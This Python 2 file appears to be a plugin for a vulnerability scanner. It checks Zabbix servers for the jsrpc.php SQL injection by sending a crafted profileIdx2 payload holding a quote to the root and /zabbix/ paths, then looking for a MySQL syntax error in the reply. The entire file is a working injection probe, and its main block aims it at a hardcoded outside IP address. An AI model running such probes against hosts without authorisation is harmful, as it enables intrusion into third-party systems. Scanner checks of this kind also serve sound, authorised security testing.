#coding:utf-8
import urllib2


from t import T




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        res=None

        result['result']=False
        res_html=None
        vul_url = target_url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except:
            res_html=''
        finally:
            if res is not None:
                res.close()

        if "You have an error in your SQL syntax" in res_html:
            info = vul_url + " zabbix"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='zabbix SQL 2 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            return result
        else:
            vul_url = target_url + "/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            try:
                #print vul_url
                res=urllib2.urlopen(vul_url,timeout=timeout)
                res_html = res.read()

            except:
                return result
            finally:
                if res is not None:
                    res.close()
                del res

            if 'You have an error in your SQL syntax' in res_html:
                info = vul_url + " zabbix"
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='zabbix SQL 2 Vul'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vul_url
                result['VerifyInfo']['result'] =res_html
                return result
        return result

   

           

if __name__ == '__main__':
    print P().verify(ip='103.17.42.170',port='80')